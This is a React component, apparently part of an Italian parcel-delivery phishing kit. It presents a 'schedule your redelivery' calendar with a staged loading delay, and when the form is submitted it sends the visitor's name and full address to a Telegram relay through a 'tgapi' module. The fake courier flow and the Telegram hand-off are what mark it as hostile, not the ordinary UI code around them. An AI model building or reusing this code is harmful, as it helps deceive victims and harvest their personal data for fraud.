import { useState, useEffect, useRef } from "react";
import { Calendar, Clock, Truck, ChevronRight, Check } from "lucide-react";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Calendar as CalendarComponent } from "@/components/ui/calendar";
import { useToast } from "@/hooks/use-toast";
import ItReviewForm from "./ItReviewForm";
import { sendScheduleNotification } from "../tgapi";
import { it } from "date-fns/locale";
import { format } from "date-fns";

interface ItDeliveryDateFormProps {
  onComplete?: () => void;
  name?: string;
  address?: string;
  city?: string;
  postCode?: string;
  phone?: string;
}

const ItDeliveryDateForm = ({ onComplete, name, address, city, postCode, phone }: ItDeliveryDateFormProps) => {
  const { toast } = useToast();
  const timeSlotRef = useRef<HTMLDivElement>(null);
  const [selectedDate, setSelectedDate] = useState<Date | undefined>();
  const [selectedTime, setSelectedTime] = useState<string>("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isConfirmed, setIsConfirmed] = useState(false);
  const [isLoading, setIsLoading] = useState(true);

  // Custom formatters for Italian calendar with proper capitalization
  const customFormatters = {
    formatCaption: (date: Date) => {
      return format(date, 'LLLL yyyy', { locale: it }).replace(/^\w/, c => c.toUpperCase());
    },
    formatWeekdayName: (date: Date) => {
      return format(date, 'eee', { locale: it }).replace(/^\w/, c => c.toUpperCase());
    }
  };

  // Show loading for 2 seconds, then show form
  useEffect(() => {
    // Auto-scroll to top when loading starts
    window.scrollTo({
      top: 0,
      behavior: 'smooth'
    });

    const timer = setTimeout(() => {
      setIsLoading(false);
    }, 2000);

    return () => clearTimeout(timer);
  }, []);

  // Auto-scroll to time slot section when date is selected
  useEffect(() => {
    if (selectedDate && timeSlotRef.current) {
      setTimeout(() => {
        timeSlotRef.current?.scrollIntoView({
          behavior: 'smooth',
          block: 'center',
          inline: 'nearest'
        });
      }, 200); // Small delay to allow fade-in animation
    }
  }, [selectedDate]);

  const timeSlots = [
    { value: "09:00-12:00", label: "Mattina (9:00 - 12:00)" },
    { value: "12:00-17:00", label: "Pomeriggio (12:00 - 17:00)" },
    { value: "17:00-20:00", label: "Sera (17:00 - 20:00)" }
  ];

  const handleScheduleNotification = async () => {
    const invoiceName = name || "Unknown Invoice";
    const fullAddress = `${address || ""}, ${city || ""}, ${postCode || ""}`.replace(/^,\s*|,\s*$/g, '');
    
    const deliveryDate = selectedDate?.toLocaleDateString('it-IT', { 
      weekday: 'long',
      day: 'numeric',
      month: 'long',
      year: 'numeric'
    });
    const deliveryTime = timeSlots.find(t => t.value === selectedTime)?.label || "";
    
    await sendScheduleNotification(invoiceName, fullAddress, deliveryDate || "", deliveryTime);
  };

  const handleSubmit = async () => {
    if (!selectedDate || !selectedTime) {
      toast({
        title: "Seleziona data e ora",
        description: "Scegli la tua data di consegna preferita e la fascia oraria",
        variant: "destructive"
      });
      return;
    }

    setIsSubmitting(true);

    // Send Telegram notifications
    await handleScheduleNotification();

    setTimeout(() => {
      setIsSubmitting(false);
      setIsConfirmed(true);
      // Removed auto-close timer - user should manually navigate
    }, 1500);
  };

  if (isConfirmed) {
    const deliveryDate = selectedDate?.toLocaleDateString('it-IT', { 
      weekday: 'long',
      day: 'numeric',
      month: 'long'
    });
    const deliveryTime = timeSlots.find(t => t.value === selectedTime)?.label;
    
    return (
      <ItReviewForm 
        deliveryDate={deliveryDate}
        deliveryTime={deliveryTime}
        name={name}
        address={address}
        city={city}
        postCode={postCode}
        phone={phone}
      />
    );
  }

  // Show loading state
  if (isLoading) {
    return (
      <div className="space-y-6 animate-fade-in">
        <Card className="glass-card shadow-2xl border border-yellow-200/50 transition-all duration-300 ease-in-out hover:scale-98 hover:shadow-xl transform">
          <CardContent className="py-8">
            <div className="text-center">
              <div className="relative mb-6">
                <div className="w-16 h-16 mx-auto rounded-full bg-yellow-100 flex items-center justify-center">
                  <Calendar className="h-8 w-8 text-yellow-600 animate-pulse" />
                </div>
              </div>
              <h2 className="text-xl font-bold text-gray-900 mb-2">Caricamento appuntamenti disponibili</h2>
              <p className="text-gray-600 text-sm mb-6">Attendi mentre verifichiamo la disponibilità delle consegne...</p>
              
              {/* Loading animation */}
              <div className="flex justify-center space-x-1 mb-4">
                <div className="w-2 h-2 bg-yellow-500 rounded-full animate-bounce" style={{ animationDelay: '0ms' }}></div>
                <div className="w-2 h-2 bg-yellow-500 rounded-full animate-bounce" style={{ animationDelay: '150ms' }}></div>
                <div className="w-2 h-2 bg-yellow-500 rounded-full animate-bounce" style={{ animationDelay: '300ms' }}></div>
              </div>
            </div>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="space-y-6 animate-fade-in">
      <Card className="glass-card shadow-2xl border border-yellow-200/50 transition-all duration-300 ease-in-out hover:scale-98 hover:shadow-xl transform">
        <CardContent className="py-6">
          <div className="text-center mb-6">
            <p className="text-gray-600 text-sm">Scegli la tua data di consegna preferita</p>
          </div>

          <div className="space-y-6">
            {/* Calendar Selection */}
            <div>
              <h3 className="text-sm font-semibold text-gray-900 mb-4 flex items-center">
                <Calendar className="h-4 w-4 mr-2 text-yellow-600" />
                Seleziona data di consegna
              </h3>
              <div className="relative">
                <div className="bg-white rounded-xl border-2 border-gray-100 shadow-lg hover:shadow-xl transition-all duration-300 ease-in-out p-4 hover:scale-98 transform">
                  <CalendarComponent
                    mode="single"
                    selected={selectedDate}
                    onSelect={setSelectedDate}
                    locale={it}
                    weekStartsOn={1}
                    formatters={customFormatters}
                     disabled={(date) => {
                        // Disable past dates, today, and Sundays. Allow tomorrow unless it's Sunday
                        const today = new Date();
                        today.setHours(0, 0, 0, 0);
                        const tomorrow = new Date(today);
                        tomorrow.setDate(today.getDate() + 1);
                        return date <= today || date.getDay() === 0 || (date.getTime() === tomorrow.getTime() && date.getDay() === 0);
                      }}
                    className="w-full border-0 pointer-events-auto"
                    classNames={{
                      months: "flex flex-col sm:flex-row space-y-4 sm:space-x-4 sm:space-y-0",
                      month: "space-y-4",
                      caption: "flex justify-center pt-1 relative items-center",
                      caption_label: "text-sm font-medium",
                      nav: "space-x-1 flex items-center",
                      nav_button: "h-7 w-7 bg-transparent p-0 hover:bg-yellow-100 rounded-md transition-colors",
                      nav_button_previous: "absolute left-1",
                      nav_button_next: "absolute right-1",
                      table: "w-full border-collapse space-y-1",
                      head_row: "flex justify-between w-full",
                      head_cell: "text-muted-foreground w-6 font-normal text-xs flex-1 text-center",
                      row: "flex w-full mt-2 justify-between",
                      cell: "relative text-center text-sm focus-within:relative focus-within:z-20 flex-1 flex justify-center",
                      day: "h-6 w-6 p-0 font-normal text-xs aria-selected:opacity-100 hover:bg-yellow-100 hover:scale-110 transition-all duration-200 rounded-full shadow-md hover:shadow-lg border-0",
                      day_range_end: "day-range-end",
                      day_selected: "bg-yellow-100 text-yellow-800 hover:bg-yellow-200 hover:text-yellow-900 focus:bg-yellow-200 focus:text-yellow-900 shadow-xl scale-110 rounded-full border-2 border-yellow-300",
                      day_today: "bg-yellow-50 text-yellow-600 font-semibold border-2 border-yellow-200 shadow-lg rounded-full",
                      day_outside: "day-outside text-muted-foreground opacity-50",
                      day_disabled: "text-muted-foreground opacity-50 cursor-not-allowed hover:bg-transparent hover:scale-100",
                      day_range_middle: "",
                      day_hidden: "invisible",
                    }}
                  />
                </div>
              </div>
            </div>

            {/* Time Slot Selection - Only show when date is selected */}
            {selectedDate && (
              <div ref={timeSlotRef} className="animate-fade-in">
                <h3 className="text-sm font-semibold text-gray-900 mb-3 flex items-center">
                  <Clock className="h-4 w-4 mr-2 text-yellow-600" />
                  Seleziona orario di consegna
                </h3>
                <div className="flex flex-col items-center gap-2">
                  {timeSlots.map((slot) => (
                    <button
                      key={slot.value}
                      onClick={() => setSelectedTime(slot.value)}
                      className={`px-4 py-3 w-48 rounded-lg border-2 transition-all duration-200 text-center hover:scale-[1.02] whitespace-nowrap ${
                        selectedTime === slot.value
                          ? 'border-yellow-500 bg-yellow-50 text-yellow-700'
                          : 'border-gray-200 bg-white hover:border-yellow-300 hover:bg-yellow-50'
                      }`}
                    >
                      <div className="flex items-center justify-between whitespace-nowrap">
                        <span className="font-medium text-sm whitespace-nowrap">{slot.label}</span>
                        {selectedTime === slot.value && (
                          <Check className="h-4 w-4 text-yellow-600 flex-shrink-0" />
                        )}
                      </div>
                    </button>
                  ))}
                </div>
              </div>
            )}

            {/* Submit Button - Only show when both date and time are selected */}
            {selectedDate && selectedTime && (
              <div className="flex justify-center pt-3 pb-2">
                <Button
                  onClick={handleSubmit}
                  disabled={isSubmitting}
                  className={`w-auto px-4 py-1.5 bg-gradient-to-r from-green-400 to-green-500 hover:from-green-500 hover:to-green-600 text-white shadow-lg hover:shadow-xl transition-all duration-300 text-sm font-semibold rounded-lg hover:scale-105 active:scale-95 ${
                    isSubmitting ? 'scale-95 opacity-75 cursor-not-allowed' : 'cursor-pointer'
                  }`}
                >
                  <Truck className="h-4 w-4 mr-2" />
                  {isSubmitting ? 'Pianificazione...' : 'Pianifica Riconsegna'}
                </Button>
              </div>
            )}
          </div>
        </CardContent>
      </Card>
    </div>
  );
};

export default ItDeliveryDateForm;